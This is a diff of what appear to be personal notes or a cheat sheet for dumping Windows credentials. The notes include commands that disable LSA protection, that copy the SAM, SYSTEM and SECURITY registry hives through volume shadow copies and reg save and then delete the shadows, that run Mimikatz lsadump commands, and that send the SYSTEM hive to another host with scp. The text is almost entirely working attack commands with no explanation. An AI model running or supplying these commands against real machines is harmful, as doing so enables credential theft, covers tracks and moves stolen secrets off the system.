@@ -14,14 +14,30 @@ C:\Windows\System32\config\SECURITY ( Security Policy ) HKLM\SECURITY\Policy\Sec
   SeBackupPrivilege
   SeDebugPrivilege
 
+# Disable RunAsPPL
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 
-# Shadow Copy:
-Run as nt authority\system
-psexec.exe -s -i cmd.exe
+# Shadow Copy
+vssadmin list shadows ( List Available Shadows )
+
+vssadmin create shadow /for=C:   -->   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY
+
+vssadmin delete shadows /for=C: /quiet
+
+# Reg 
+Run as nt authority\system: psexec.exe -s -i cmd.exe
 reg.exe save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\SYSTEM /y 
 reg.exe save HKEY_LOCAL_MACHINE\SAM C:\Temp\SAM /y
 reg.exe save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\SECURITY /y
+
+# Mimikatz
+privilege::debug
+token::elevate
+lsadump::sam
+lsadump::lsa /patch
 
 # File Uploader
 scp C:\Windows\System32\config\SYSTEM sako@192.168.0.250:/home/sako/Labaratory/ ( SSH File Sender )
